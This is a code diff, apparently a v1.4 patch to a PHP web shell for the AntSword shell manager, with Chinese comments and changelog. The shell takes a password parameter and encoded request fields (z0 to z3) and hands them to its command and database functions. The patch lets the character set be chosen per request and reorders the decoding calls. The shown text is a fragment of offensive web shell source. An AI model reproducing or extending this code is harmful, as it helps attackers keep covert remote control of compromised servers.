@@ -24,6 +24,10 @@
 *  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 *
 * ChangeLog:
+*   Date: 2020/03/26 v1.4
+*    1. 修复由于decode函数与EC函数位置写反而导致的乱码问题
+*    2. 增加动态修改字符编码接口
+*
 *   Date: 2019/05/22 v1.3
 *    1. 支持 mysqli 连接非默认端口
 *
@@ -45,7 +49,8 @@ $pwd = "ant"; //连接密码
 $encoder = ""; // default
 // $encoder = "base64"; //base64
 // $encoder = "hex"; // hex
-$cs = "UTF-8";
+//$cs = "UTF-8";
+$cs=isset($_REQUEST['charset'])?$_REQUEST['charset']:"UTF-8";
 
 /**
 * 字符编码处理
@@ -377,10 +382,10 @@ function listcmd($binarr){
 @set_magic_quotes_runtime(0);
 
 $funccode = EC($_REQUEST[$pwd]);
-$z0 = decode(EC($_REQUEST['z0']));
-$z1 = decode(EC($_REQUEST['z1']));
-$z2 = decode(EC($_REQUEST['z2']));
-$z3 = decode(EC($_REQUEST['z3']));
+$z0 = EC(decode($_REQUEST['z0']));
+$z1 = EC(decode($_REQUEST['z1']));
+$z2 = EC(decode($_REQUEST['z2']));
+$z3 = EC(decode($_REQUEST['z3']));
 
 // echo "<meta HTTP-EQUIV=\"csontent-type\" content=\"text/html; charset={$cs}\">";
 echo "->"."|";
